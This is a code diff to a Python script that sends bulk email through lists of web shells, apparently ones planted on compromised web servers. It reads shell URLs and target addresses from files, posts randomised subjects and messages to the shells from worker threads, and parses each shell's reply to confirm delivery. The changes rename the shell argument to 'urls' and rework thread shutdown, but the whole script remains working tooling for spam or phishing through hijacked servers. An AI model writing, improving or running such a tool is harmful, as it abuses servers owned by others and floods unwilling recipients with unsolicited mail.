@@ -5,12 +5,12 @@ import queue
 import random
 import re
 import sys
-from threading import Event, Thread
+from threading import Thread
 from typing import Tuple
 
 import requests
 
-__version__ = '0.1.2'
+__version__ = '0.1.3'
 
 log = logging.getLogger(__name__.split('.')[0])
 
@@ -38,18 +38,13 @@ def random_text(s: str) -> str:
 
 
 def worker(
-    *,
-    args: argparse.Namespace,
-    q: queue.Queue,
-    shells: Tuple[str],
-    stopped: Event,
+    *, args: argparse.Namespace, q: queue.Queue, urls: Tuple[str],
 ) -> None:
-    while not stopped.is_set():
-        try:
-            email = q.get(timeout=10)
-        except queue.Empty:
-            continue
-        shell_url = random.choice(shells)
+    while True:
+        email = q.get()
+        if email is None:
+            break
+        url = random.choice(urls)
         subject = random_text(args.subject)
         message = random_text(args.message)
         data = dict(
@@ -67,7 +62,7 @@ def worker(
         if args.reply_to:
             data.update({'replyTo': args.reply_to})
         try:
-            r = requests.post(shell_url, data=data, timeout=args.timeout)
+            r = requests.post(url, data=data, timeout=args.timeout)
             res = r.text.split(".innerHTML='")[1].split("'")[0]
             if res != 't':
                 log.warn('email not sent: %s', email)
@@ -97,18 +92,24 @@ def main() -> int:
         parser = argparse.ArgumentParser(
             formatter_class=argparse.ArgumentDefaultsHelpFormatter
         )
-        parser.add_argument(
-            'shells_filename', metavar='SHELLS_FILE', help='shells filename'
-        )
-        parser.add_argument(
-            'emails_filename', metavar='EMAILS_FILE', help='emails filename'
-        )
         parser.add_argument('message', metavar='MESSAGE', help='message')
         parser.add_argument(
             '-s', '--subject', help='subject', default='No Subject'
         )
         parser.add_argument(
             '--reply-to', dest='reply_to', help='reply-to',
+        )
+        parser.add_argument(
+            '--urls',
+            dest='urls_filename',
+            help='web shell urls filename each url in new line',
+            default='urls.txt',
+        )
+        parser.add_argument(
+            '--emails',
+            dest='emails_filename',
+            help='emails filename each email in new line',
+            default='emails.txt',
         )
         parser.add_argument(
             '-t', '--timeout', help='request timeout', default=15.0, type=float
@@ -124,7 +125,7 @@ def main() -> int:
         parser.add_argument(
             '-d',
             '--debug',
-            help='print debug messages',
+            help='output debug messages',
             action='store_const',
             dest='loglevel',
             const=logging.DEBUG,
@@ -143,9 +144,9 @@ def main() -> int:
             parser.print_usage()
             return 0
         args = parser.parse_args()
-        with open(args.shells_filename) as f:
-            shells = set(f.read().splitlines())
-            shells = list(shells)
+        with open(args.urls_filename) as f:
+            urls = set(f.read().splitlines())
+            urls = list(urls)
         with open(args.emails_filename) as f:
             emails = set(f.read().splitlines())
         logging.basicConfig()
@@ -157,19 +158,16 @@ def main() -> int:
         q = queue.Queue()
         for email in emails:
             q.put_nowait(email)
-        num_workers = min(len(emails), args.workers)
+        num_workers = min(q.qsize(), args.workers)
         workers = []
-        stopped = Event()
         for _ in range(num_workers):
-            t = Thread(
-                target=worker,
-                kwargs=dict(args=args, q=q, shells=shells, stopped=stopped,),
-            )
+            t = Thread(target=worker, kwargs=dict(args=args, q=q, urls=urls),)
             t.daemon = True
             workers.append(t)
             t.start()
         q.join()
-        stopped.set()
+        for _ in range(num_workers):
+            q.put_nowait(None)
         for i in range(num_workers):
             workers[i].join()
         log.info('finished')
